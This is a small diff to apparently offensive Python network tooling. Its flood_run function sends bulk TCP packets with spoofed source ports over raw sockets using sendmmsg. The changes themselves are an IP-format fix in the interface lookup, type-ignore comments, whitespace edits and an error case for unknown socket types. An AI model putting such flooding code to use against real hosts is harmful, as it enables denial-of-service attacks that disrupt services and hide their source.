@@ -1,3 +1,4 @@
+from ctypes import ArgumentError
 from pathlib import Path
 import subprocess
 import socket
@@ -24,21 +25,21 @@ def sniff_run(dst_ip: str, iface: str, spoof_fields: str = "", pkts_count: int =
 
 def flood_run(count, ip_layer: IPLayer, iface, dport, sock, sport: Optional[int] = None) -> int:
   dst_ip = ip_layer.ip_hdr.dst_ip
-  if not iface: iface = EthernetLayer.get_default_interface(dst_ip)
+  if not iface: iface = EthernetLayer.get_default_interface(socket.inet_ntoa(dst_ip))
   else: iface = iface
   limit = Limitation(count=count)
   checksum = Checksum(dst_ip)
   tcp_spoof_fields = {"sport"} if not sport else None
-  tcp: TCPLayer = TCPLayer(TCPHeader(12345, dport), spoof_fields=tcp_spoof_fields, 
+  tcp: TCPLayer = TCPLayer(TCPHeader(12345, dport), spoof_fields=tcp_spoof_fields, # type: ignore
                           culc_check=checksum.tcp_checksum_buf)
   match sock:
     case "inet_raw":
       fd: socket.socket = _create_af_inet_raw_socket()
       init_pkt: Packet = Packet(ip_layer, tcp, fd_type=sock, pkts_max=1, pkt_len=40, _sorted=True)
-      return init_pkt.send_pkts(fd=fd, limit=limit, 
-                                dst_ip=socket.inet_ntoa(dst_ip), 
+      return init_pkt.send_pkts(fd=fd, limit=limit,
+                                dst_ip=socket.inet_ntoa(dst_ip),
                                 dport=dport
-      )
+      ) # type: ignore
     case "packet_raw":
       sendmmsg = SendMmsg()
       src_mac, dst_mac = EthernetHeader.get_src_mac(iface), EthernetHeader.get_dst_mac(iface)
@@ -48,9 +49,10 @@ def flood_run(count, ip_layer: IPLayer, iface, dport, sock, sport: Optional[int]
       send_func_kwargc = {"pkt_size": 54, "iov_max": pkts_max, "fastmmsg": sendmmsg.fast_call}
       init_pkt: Packet = Packet(eth, ip_layer, tcp, fd_type=sock, pkts_max=pkts_max, _sorted=True)
       fd: socket.socket = _create_af_packet_socket(iface)
-      return init_pkt.send_pkts(fd=fd, limit=limit, **send_func_kwargc)
+      return init_pkt.send_pkts(fd=fd, limit=limit, **send_func_kwargc) # type: ignore
+    case _: raise ArgumentError(f"Unknown socket type: {sock}")
 
-  
+
 def sleeping():
   print("Sleeping...", file=sys.stderr)
   time.sleep(SleepTime)
